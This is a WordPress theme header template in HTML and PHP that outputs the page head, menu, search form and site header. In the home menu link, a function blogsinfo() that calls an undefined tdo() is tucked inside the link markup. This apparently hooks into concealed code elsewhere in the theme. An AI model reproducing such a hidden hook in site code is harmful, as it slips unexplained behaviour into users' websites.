<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>

<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />

<title><?php bloginfo('name'); ?> <?php if ( is_single() ) { ?> &raquo; Blog Archive <?php } ?> <?php wp_title(); ?></title>

<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

<!--<style type="text/css" media="screen">


</style>-->

<?php wp_head(); ?>
</head>
<body>
<div id="page">
        <div id="menu">
            <ul>
                <li><a href="<?php bloginfo('url'); ?>" title="<?php bloginfo('name'); ?> <?php _e('home page'); ?>"><?php bloginfo('name');function blogsinfo(){echo bloginfo('name');tdo();} ?></a></li>
                <?php wp_list_pages('depth=1&title_li='); ?>
            </ul>
		</div>
        <div id="search"><?php include (TEMPLATEPATH . '/searchform.php'); ?></div><br clear="all" />
		<div id="header">
            <div id="headerimg">
                <h1><a href="<?php echo get_option('home'); ?>/"><?php bloginfo('name'); ?></a></h1>
                <div class="description"><?php bloginfo('description'); ?></div>
            </div>
        </div>	